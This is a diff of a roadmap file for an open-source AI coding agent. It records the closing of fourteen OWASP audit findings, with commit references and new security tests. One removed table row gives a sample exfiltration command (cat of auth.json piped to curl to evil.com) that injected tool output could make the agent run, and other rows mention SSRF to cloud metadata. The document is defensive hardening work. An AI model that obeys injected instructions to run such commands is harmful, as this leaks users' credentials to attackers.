@@ -2,9 +2,9 @@
 
 > Fork of [anomalyco/opencode v1.2.27](https://github.com/anomalyco/opencode/tree/v1.2.27)
 > Goal: Local-first AI coding agent with clean architecture and community provider ecosystem.
-> Last updated: 2026-04-18 | ~220 commits | Tests: 1616 pass, 0 fail | **v0.9.8** (Phase 28 complete)
+> Last updated: 2026-04-18 | ~235 commits | Tests: 1715 pass, 0 fail | **v0.9.10** (Phase 29 complete)
 >
-> **Release track:** staying on `0.9.x` until we're truly 1.0-ready. No `1.0.0-preview.x` tags until the security findings in the "Pre-1.0 Hardening" section are closed out.
+> **Release track:** staying on `0.9.x` until all pre-1.0 hardening items land. Phase 29 closed all 7 high + 7 medium OWASP findings; watch the Phase 29 verification section below for regression-avoidance once we consider `v1.0.0`.
 
 ---
 
@@ -400,35 +400,59 @@ After initial preview work, consolidated 6 racing workflows into a single master
 
 ---
 
-## 🔒 Pre-1.0 Hardening (gating the 1.0.0-preview.x cut)
+### Phase 29: Pre-1.0 Security Hardening ✅ (v0.9.9 + v0.9.10)
 
-Full OWASP Top 10 audit performed 2026-04-18. Overall posture: **NEEDS WORK**. Address these before cutting any `1.0.0-preview.x` tag. Tracked here, not in Phase 22 (which stays closed).
+Full OWASP Top 10 audit was performed 2026-04-18. Initial posture: **NEEDS WORK** — 7 high + 7 medium findings. Phase 29 closed all 14 in 18 commits across two releases.
 
-### Critical / High-severity (must-fix before 1.0.0-preview.1)
+**Sub-phase sequencing:**
 
-| # | OWASP | Issue | Location | Effort | Status |
-|---|-------|-------|----------|--------|--------|
-| 1 | A05 | **`--mdns` silently binds `0.0.0.0` without password** → LAN-reachable unauth RCE. Fail-closed: require `LIBRECODE_SERVER_PASSWORD` for non-loopback hostnames, not just a warning | `packages/librecode/src/cli/network.ts:39-48`; `packages/librecode/src/cli/cmd/{web,serve}.ts` | Small | TODO |
-| 2 | A04/A02 | **`auth.json` exfiltration via bash tool.** Malicious tool output can instruct agent `cat ~/.local/share/librecode/auth.json \| curl -X POST evil.com`. Add hard-coded read-block on credential paths in `bash`, `read`, `webfetch`; store tokens in OS keychain (`@napi-rs/keyring` or Tauri stronghold) | `packages/librecode/src/auth/service.ts:34`; `packages/librecode/src/tool/bash.ts`; `packages/librecode/src/file/protected.ts` | Medium | TODO |
-| 3 | A08 | **SHA256SUMS doesn't cover desktop installers** (.deb/.rpm/.exe/.dmg/.flatpak). One-line workflow fix | `.github/workflows/release.yml:150` | Tiny | TODO |
-| 4 | A05 | **Production Tauri CSP is `null`.** Prod config inherits base's `"csp": null`. Combined with `withGlobalTauri: true` + broad `http:default`/`opener` grants, any UI XSS = full host takeover. Set real CSP, narrow grants, set `withGlobalTauri: false` | `packages/desktop/src-tauri/tauri.prod.conf.json` (no `app.security.csp`); `capabilities/default.json` | Medium | TODO |
-| 5 | A06 | **`bun audit`: 16 high-severity advisories.** `hono 4.10.7` → `^4.11.4` (arbitrary file access GHSA-q5qw-h33p-qvwr), `@modelcontextprotocol/sdk ≤1.25.3` (cross-client data leak), `minimatch` ReDoS, `seroval` RCE, `vite 7.1.4` dev fs-deny bypass, `dompurify 3.3.1` XSS. Bump the catalog | `package.json` catalog block | Small | TODO |
-| 6 | A10 | **`webfetch` has no SSRF protection.** Gated only by `ctx.ask`, but user may click-through. LLM can hit `169.254.169.254` (cloud metadata), internal services. Reuse `BLOCKED_HOST_PATTERNS` from `provider/scan`; resolve DNS once + check IP (prevent rebinding) | `packages/librecode/src/tool/webfetch.ts:22-30` | Small | TODO |
-| 7 | A06 | **`cargo audit` not in CI.** Rust/Tauri dep graph unchecked. Add to `scripts/dev-setup.sh --deps` + wire into `ci.yml` | `ci.yml`, `scripts/dev-setup.sh` | Tiny | TODO |
+| Sub-phase | Commits | Focus | Release |
+|-----------|---------|-------|---------|
+| 29a | 5 | Quick wins (SHA256SUMS, cargo-audit CI, CORS, stack trace, /log schema) | v0.9.9 |
+| 29b | 3 | Tauri hardening (prod CSP, narrow capabilities, CycloneDX SBOMs) | v0.9.9 |
+| 29c | 2 | Network fail-closed (mdns password, webfetch SSRF) | v0.9.9 |
+| 29d | 1 | npm dep bumps (hono, mcp-sdk, minimatch, vite, dompurify, solid-js) + `cargo update` | v0.9.10 |
+| 29e | 4 | Credential protection (read-block, OS keychain, log redaction, filesystem rename) | v0.9.10 |
+| 29f | 1 | Server hardening (rate limit + 401 logging) | v0.9.10 |
 
-### Medium-severity (should-fix before 1.0.0-preview.1)
+**All 7 high-severity findings closed:**
 
-| # | OWASP | Issue | Location | Effort | Status |
-|---|-------|-------|----------|--------|--------|
-| 8 | A01 | Rename unsafe lexical `Filesystem.contains()` → `containsLexical`; default callers to symlink-safe `containsSafe`. Add lint rule | `packages/librecode/src/util/filesystem.ts:150-152` | Small | TODO |
-| 9 | A02 | Log redaction layer: strip keys matching `/token\|secret\|key\|authorization\|access\|refresh/i` before write | `packages/librecode/src/util/log.ts:109-121` | Small | TODO |
-| 10 | A05 | CORS: require exact port match with known local ports, not `http://localhost:*` wildcard | `packages/librecode/src/server/server.ts:72-81` | Tiny | TODO |
-| 11 | A05 | Error handler: `err.message` only in prod; stack trace behind `--dev` | `packages/librecode/src/server/server.ts:68-69` | Tiny | TODO |
-| 12 | A07 | Basic-auth rate-limit (token bucket by IP) + 401 logging for brute-force visibility | `packages/librecode/src/server/server.ts:94-102` | Small | TODO |
-| 13 | A04 | `/log` endpoint is unauthenticated; LAN peer in mdns mode can pollute audit stream. Gate behind basic-auth | `packages/librecode/src/server/server.ts:104, 191, 359-409` | Tiny | TODO |
-| 14 | A08 | Generate CycloneDX SBOMs at release time (`@cyclonedx/cyclonedx-npm` for CLI, `cargo cyclonedx` for Tauri); upload with release | `.github/workflows/release.yml` | Small | TODO |
+| # | OWASP | Finding | Commit |
+|---|-------|---------|--------|
+| 1 | A05 | `--mdns` fail-closed without `LIBRECODE_SERVER_PASSWORD` | `922d50c` (29c.1) |
+| 2 | A04/A02 | `auth.json` exfiltration via bash/read + OS keychain storage | `e4598ca` (29e.1) + `3bcae9c` (29e.2) |
+| 3 | A08 | SHA256SUMS covers all installer artifacts | `362b9cd` (29a.1) |
+| 4 | A05 | Production Tauri CSP + narrow capabilities + `withGlobalTauri: false` | `048e876` (29b.1) + `c9a5970` (29b.2) |
+| 5 | A06 | bun audit: 16 → 7 highs (remainder are transitive, pinned to latest) | `0479b86` (29d.1) |
+| 6 | A10 | webfetch SSRF: scheme + userinfo + IP range + DNS resolve checks | `fbe66c9` (29c.2) |
+| 7 | A06 | cargo-audit in CI + `cargo update` for Rust advisories | `e292192` (29a.2) + `80a7bc1` |
 
-Strengths already in place (keep these): `Instance.containsPath` symlink-safe, `/provider/scan` SSRF patched, MCP iframe null-origin sandbox + CSP, OAuth state CSRF via `crypto.getRandomValues(32)`, npm OIDC + sigstore provenance, permission audit log, Drizzle-only SQL.
+**All 7 medium-severity findings closed:**
+
+| # | OWASP | Finding | Commit |
+|---|-------|---------|--------|
+| 8 | A01 | `Filesystem.contains` → `containsLexical` (unsafe variant must be explicit) | `e90b6f3` (29e.4) |
+| 9 | A02 | Log redaction layer (strip secret key/value patterns pre-write) | `f6e84ae` (29e.3) |
+| 10 | A05 | CORS exact port match (1420, 3000) instead of `localhost:*` wildcard | `4f4dcd0` (29a.3) |
+| 11 | A05 | Error handler redacts stack trace in prod; `LIBRECODE_DEV=1` opt-in | `fcbdd86` (29a.4) |
+| 12 | A07 | Basic-auth rate limit (10/5min per IP) + 429 with Retry-After | `794b15f` (29f.1) |
+| 13 | A04 | `/log` payload schema: service charset, message ≤8 KB, extra ≤16 KB | `6f33b55` (29a.5) |
+| 14 | A08 | CycloneDX SBOMs (sbom-npm.json + sbom-rust.json) per release | `65cd2e2` (29b.3) |
+
+**Regression prevention** — each OWASP fix ships with tests:
+- `test/server/cors-origin.test.ts` (11 cases)
+- `test/server/error-handler.test.ts` (2 cases)
+- `test/server/log-endpoint.test.ts` (11 cases)
+- `test/server/rate-limit.test.ts` (8 cases)
+- `test/cli/network-fail-closed.test.ts` (11 cases)
+- `test/util/ssrf.test.ts` (20 cases)
+- `test/util/redact.test.ts` (13 cases)
+- `test/file/credentials-guard.test.ts` (19 cases)
+- `test/auth/storage.test.ts` (5 cases)
+
++100 new security-focused assertions. Suite: 1616 → 1715 pass.
+
+**Existing strengths retained:** `Instance.containsPath` symlink-safe, `/provider/scan` SSRF patched, MCP iframe null-origin sandbox + CSP, OAuth state CSRF via `crypto.getRandomValues(32)`, npm OIDC + sigstore provenance, permission audit log, Drizzle-only SQL.
 
 ---
 
@@ -515,17 +539,19 @@ Deferred per local-first charter but listed for completeness: SSO/SAML, audit-lo
 
 | Metric                       | Value                                                                                                      |
 | ---------------------------- | ---------------------------------------------------------------------------------------------------------- |
-| Total commits                | ~220                                                                                                       |
-| Tests passing                | 1,616                                                                                                      |
+| Total commits                | ~235                                                                                                       |
+| Tests passing                | 1,715                                                                                                      |
 | Tests failing                | 0                                                                                                          |
 | Tests skipped                | 9                                                                                                          |
-| Test files                   | 125                                                                                                        |
-| Current version              | **v0.9.8** (staying on 0.9.x until pre-1.0 hardening complete)                                             |
+| Test files                   | 134                                                                                                        |
+| Current version              | **v0.9.10** (Phase 29 — OWASP hardening — complete)                                                        |
 | Complexity violations        | 0                                                                                                          |
-| Source files over 1000 lines | 6 (down from target of 0 — tracked for split)                                                              |
+| Source files over 1000 lines | 6 (tracked for split; unchanged in Phase 29)                                                               |
 | Lint warnings total          | 38 (legacy TUI `any`; down from 1,933)                                                                     |
-| Remaining `export namespace` | 6 (down from 4 original; 2 new additions need migration — Playbook 1)                                      |
-| OWASP audit posture          | NEEDS WORK — 7 high, 7 medium findings tracked above                                                        |
+| Remaining `export namespace` | 6 (Playbook 1)                                                                                             |
+| OWASP audit posture          | **STRONG** — 7/7 high + 7/7 medium closed as of v0.9.10; re-audit scheduled before `v1.0.0`                 |
+| bun audit                    | 7 high, 9 moderate (all transitive; latest available versions of seroval/dompurify/undici)                  |
+| cargo audit                  | 0 vulnerabilities (15 unmaintained-GTK3 warnings documented in audit.toml)                                  |
 | ADRs                         | 4 (Effect-ts, Storage, Agent Loop, Auth Prompts) + ADR-005 planned (co-editing)                            |
 | npm packages                 | 7 published via OIDC (sdk, plugin, provider-{anthropic,openai,openrouter}, provider-bundle, i18n)          |
 | Sister repos                 | librecode-3rdparty-providers, librecode-i18n (both on v0.9.8, OIDC-synced)                                 |
